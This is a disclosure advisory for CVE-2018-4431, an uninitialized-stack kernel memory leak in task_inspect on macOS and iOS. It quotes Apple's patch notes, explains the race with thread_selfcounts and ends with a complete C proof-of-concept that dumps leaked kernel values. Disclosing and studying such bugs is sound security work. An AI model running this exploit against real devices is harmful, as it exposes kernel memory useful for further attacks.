**Vulnerability Summary**<br>
The following advisory discusses a bug found in the kernel function task_inspect which a local user may exploit in order to read kernel memory due to an uninitialized variable.

**Vendor Response**<br>
“Kernel:
Available for: iPhone 5s and later, iPad Air and later, and iPod touch 6th generation
Impact: A local user may be able to read kernel memory
Description: A memory initialization issue was addressed with improved memory handling.
CVE-2018-4431: An independent security researcher has reported this vulnerability to
Beyond Security’s SecuriTeam Secure Disclosure program
Kernel:
Available for: macOS High Sierra 10.13.6, macOS Mojave 10.14.1
Impact: A local user may be able to read kernel memory
Description: A memory initialization issue was addressed with
improved memory handling.
CVE-2018-4431: An independent security researcher has reported this
vulnerability to Beyond Security’s SecuriTeam Secure Disclosure
program”

**CVE**<br>
CVE-2018-4431

**Credit**<br>
An independent Security Researcher has reported this vulnerability to Beyond Security’s SecuriTeam Secure Disclosure program.

**Affected systems**<br>
macOS 10.13.6 and prior versions
iOS 12.1.0 and prior versions

**Vulnerability Details**<br>
The bug is in the function task_inspect:
```c
switch (flavor) {
    case TASK_INSPECT_BASIC_COUNTS: {
        struct task_inspect_basic_counts *bc;
        uint64_t task_counts[MT_CORE_NFIXED];
        if (size < TASK_INSPECT_BASIC_COUNTS_COUNT) {
            kr = KERN_INVALID_ARGUMENT;
            break;
        }
        mt_fixed_task_counts(task, task_counts);
        bc = (struct task_inspect_basic_counts *)info_out;
#ifdef MT_CORE_INSTRS
        bc->instructions = task_counts[MT_CORE_INSTRS];
#else
        bc->instructions = 0;
#endif
        bc->cycles = task_counts[MT_CORE_CYCLES];
        size = TASK_INSPECT_BASIC_COUNTS_COUNT;
        break;
    }
```
In the case that flavor is TASK_INSPECT_BASIC_COUNTS, the stack variable task_counts will not be initialized. By making the function mt_fixed_task_counts => mt_fixed_thread_counts return
error, the task_counts will not be initialized and it will be returned to user mode.
By using the API function thread_selfcounts with a race condition we can make it return error.
Another impact is that the functions task_inspect and thread_selfcounts does not include any MACF check, so this bug can be triggered in ANY sandbox.

**PoC**<br>
```c
#import <Foundation/Foundation.h>
extern int thread_selfcounts(int type, user_addr_t buf, user_size_t nbytes);
#define THREAD_COUNT 0x10
volatile bool stop = false;
void race(){
    int err = 0;
    uint64 retu[2] = {0, 0};
    uint64* info_out = malloc(4 * 4);
    memset(info_out, 0x0 , 16);
    int size = 4;
    while(!stop){
        err = thread_selfcounts(1, &retu, sizeof(retu));
        task_inspect(mach_task_self(), 1, info_out, &size);
        if((info_out[0] & 0xffffff0000000000) != 0){
            printf("%16llx\n", info_out[0]);
            printf("%16llx\n", info_out[1]);
        }
    }
}
int main(int argc, const char * argv[]) {
    int err = 0;
    pthread_t thread[THREAD_COUNT] = {0};
    for(int z = 0; z < THREAD_COUNT; z++){
        pthread_create(&thread[z], NULL, race, NULL);
    }
    uint64 info_out[2] = {0};
    int size = 4;
    uint64 retu[2] = {0, 0};
    while(1){
        err = thread_selfcounts(1, &retu, sizeof(retu));
    }
    return 0;
}
```
